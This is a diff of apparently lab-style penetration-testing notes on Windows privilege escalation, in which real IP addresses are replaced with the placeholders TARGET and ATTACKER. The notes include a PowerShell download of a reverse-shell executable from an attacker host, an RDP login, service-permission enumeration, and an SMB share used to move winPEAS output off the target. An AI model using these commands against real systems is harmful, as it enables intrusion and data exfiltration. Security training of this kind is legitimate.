@@ -20,7 +20,7 @@ Upload it
 iwr -uri http://<ATTACKER>/reverse.exe -Outfile rev.exe
 
 RDP in
-xfreerdp /u:admin /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768
+xfreerdp /u:admin /p:'mypassword' /v:'TARGET' /cert-ignore /w:1366 /h:768
 
 NOTE:  must be rdp session
 Get-ModifiableServiceFile
@@ -46,7 +46,7 @@ on kali
 impacket-smbserver -smb2support -user test -password test test `pwd`
 
 on target
-net use z: \\192.168.45.235\test /user:test test
+net use z: \\ATTACKER\test /user:test test
 
 run winPEAS and put into shared drive
 .\winPEAS.exe > z:/winpeas.txt
